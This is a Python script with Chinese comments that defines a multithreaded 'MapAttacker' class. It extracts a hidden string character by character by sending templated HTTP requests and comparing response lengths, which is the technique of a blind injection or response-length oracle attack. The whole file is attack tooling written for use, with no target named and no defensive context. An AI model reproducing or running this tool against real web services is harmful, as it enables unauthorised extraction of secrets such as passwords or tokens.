import requests
import threading
import time
class MapAttackerResult:
    index=0
    result=''
    def __init__(self,index,result):
        self.index=index
        self.result=result
    def compare(self,cmpResult,fun=None):
        if(fun == None):
            fun=self.defaultFun
        return fun(cmpResult.result,self.result)
    def defaultFun(self,a,b):
        return len(a)==len(b)
class Runner(threading.Thread):
        parent=None
        def __init__(self,threadName,parent):
            super(Runner,self).__init__(name = threadName)
            self.parent=parent
        def run(self):
            while not self.parent.getResult():
                time.sleep(0.1)

class MapAttacker:
    lock=threading.Lock()
    url=''
    length=32
    nowLength=0
    nowIndex=0
    nowCompleteCount=0
    ranges='abcdefghijklmnopqrstuvwxyz'
    nowResult=''
    resultList=[]#List<MapAttackerResult>
    threads=[]
    maxThread=4
    #攻击当前的位数
    def __init__(self,url,length,ranges):
        self.url=url 
        self.length=length
        self.ranges=ranges
    def StartAttack(self):
        self.ResetThread(True)
        for i in range(self.maxThread):
            Runner(str(i),self).start()
    def getSingleResult(self,index):
        tarUrl=self.url.format(self.nowLength,self.nowResult+self.ranges[index:index+1])
        self.lock.release()
        try:
            tmpResponse=requests.get(tarUrl,timeout=3).text
        except:
            self.lock.acquire()
            return self.getSingleResult(index)
        
        self.lock.acquire()
        self.nowCompleteCount+=1
        if(self.nowCompleteCount>=len(self.ranges)):
            self.ComsumeNowResult()
        print(f"{index}:{tarUrl}:{str(len(tmpResponse))}")
        self.resultList.append(MapAttackerResult(index,tmpResponse)) 
    #获取指定序号的返回结果并存入到resultList[]
    def getResult(self):
        finished=False
        self.lock.acquire()
        self.nowIndex=self.nowIndex+1
        if(self.nowIndex>=len(self.ranges)):
            finished = self.nowCompleteCount>=len(self.ranges)
        else:
            self.getSingleResult(self.nowIndex)
        self.lock.release()
        return finished
    #处理本轮结果
    def ComsumeNowResult(self):
        if(not self.resultList[0].compare(self.resultList[1])):
            if(not self.resultList[1].compare(self.resultList[2])):
                self.nowResult+=self.ranges[1]
            else:
                self.nowResult+=self.ranges[0]
            return self.ResetThread()
        for i in range(0,len(self.resultList)):
            if(not self.resultList[i].compare(self.resultList[0])):
                targetIndex=self.resultList[i].index
  
                #print(f"index:{targetIndex}->{self.ranges[targetIndex]}({len(self.resultList[i].result)})")
                self.nowResult+=self.ranges[targetIndex]
                
                return self.ResetThread()
        print(f"{self.nowResult}:self.nowResult")
    def ResetThread(self,totalReset=False):
        #print(f"self.nowResult:{self.nowResult}")
        self.nowCompleteCount=0
        self.nowIndex=-1
        self.nowLength=1 if totalReset else self.nowLength+1
        self.resultList.clear()